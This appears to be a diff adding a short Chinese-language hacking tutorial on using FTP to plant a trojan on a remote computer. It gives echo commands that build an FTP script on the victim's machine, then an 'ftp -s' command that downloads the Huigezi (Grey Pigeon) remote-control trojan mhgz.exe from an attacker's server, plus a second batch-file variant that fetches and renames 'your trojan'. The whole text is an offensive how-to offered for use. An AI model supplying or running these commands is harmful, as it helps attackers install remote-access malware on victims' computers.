@@ -1,0 +1,40 @@
+ftp传马命令与教程
+
+假设我们已经有一个FTP服务器，上面有一个我们配置好的木马文件mhgz.exe,我们应该知道FTP服务器的三个参数：
+
+1、FTP服务器的IP地址：如1.1.1.1
+2、FTP服务器的用户名：如test
+3、FTP服务器的密 码：如test123
+
+在远程计算机的C***下依次输入下面的命令：
+
+1、echo open 221.202.50.125>>test.txt 登陆FTP服务器
+2、echo 123>>test.txt 用户名
+3、echo 123>>test.txt 密码
+4、echo bin>>test.txt 开始
+5、echo get mhgz.exe>>test.txt 下载灰鸽子木马
+6、echo bye>>test.txt 关闭FTP服务器
+
+输入上面命令后，在远程计算机上就会生成一个test.txt文件，内容为：
+open 1.1.1.1
+test
+test123
+bin
+get mhgz.exe
+bye
+
+现在我们在远程计算机上执行下面的命令：
+ftp -s:test.txt 意思是，读取test.txt里的参数，执行ftp命令，命令执行完后，灰鸽子木马文件mhgz.exe就下载到对方计算机里了。
+
+
+
+
+36、在cmd下用ftp上传马方法,我们可以用echo 写一个批处理文件
+echo open 你的FTP空间地址 >c:\1.bat //输入你的FTP地址
+echo 你的FTP账号 >>c:\1.bat //输入账号
+echo 你的FTP密码 >>c:\1.bat //输入密码
+echo bin >>c:\1.bat //登入
+echo get 你的木马名 c:\ ating.exe >>c:\1.bat //下载某文件到某地方并改名为什么
+echo bye >>c:\1.bat //退出
+然后执行ftp -s:c:\1.bat即可
+
